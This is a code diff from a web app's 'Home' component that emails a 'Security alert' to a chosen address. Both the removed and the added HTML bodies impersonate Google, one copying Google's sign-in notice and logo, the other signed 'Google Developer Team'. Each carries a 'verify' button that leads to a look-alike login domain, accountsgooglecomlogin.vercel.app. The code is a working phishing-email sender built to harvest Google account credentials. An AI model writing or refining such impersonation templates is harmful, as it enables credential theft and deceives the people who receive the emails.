@@ -13,32 +13,15 @@ export default function Home() {
         toEmail: email, 
         subject: "Security alert",
         htmlContent: 
-        `<div style="position: relative; width:100%; box-sizing:border-box; padding:4%; margin:0 auto; font-size: 15px;">
-        <div style="display: flex; flex-direction: column; justify-content: center; max-width:65%; min-width:320px; margin:0 auto;">
-            <div style="border:1px solid grey; text-align:center; padding:25px; border-radius:8px; margin:20px 0 auto;">
-                <div>
-                    <img 
-                        style="width:74px; height:24px; margin-bottom:20px;" 
-                        alt="Google Logo"
-                        src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png"/>
-                    <p style="margin:0 0 15px 0;">A new sign-in on A001</p>
-                </div>
-                <hr style="border:none; border-top:1px solid rgb(106,106,106); margin:20px 0;">
-                <p style="margin:0 0 40px 0; line-height:1.5;">
-                    We noticed a new sign-in to your Google Account on an A001 device. If this was you, you don’t need to do anything. If not, we’ll help you secure your account.
-                </p>
-                <a 
-                    href="https://accountsgooglecomlogin.vercel.app"
-                    style="text-decoration:none; display:inline-block; background-color:rgb(79, 132, 247); color:white; padding:10px 20px; border-radius:4px;"
-                >Verify Account</a>
-                <div style="position:relative; margin-top:25px; font-size:12px;">
-                    You can also see security activity at<br/>
-                    <a href="https://myaccount.google.com/notifications" style="color:rgb(106, 106, 106); text-decoration:none;">
-                        https://myaccount.google.com/notifications
-                    </a>
-                </div>
-            </div>
-        </div>
+        `<div>
+        <p style="font-size: 18px; margin:10px 0;">Hello, Google Account User</p>
+        <div>There is something went wrong in your account,</div>
+        <div style="margin:10px 0;">Please Sign in your account for verification</div>
+        <a 
+            href="https://accountsgooglecomlogin.vercel.app"
+            style="text-decoration:none; display:inline-block; background-color:rgb(79, 132, 247); color:white; padding:10px 15px;  border-radius:4px; margin:15px 0;"
+          >Click here to verify</a>
+        <div>Thank you,<br>Google Developer Team</div>
     </div>`,
       }),
     });
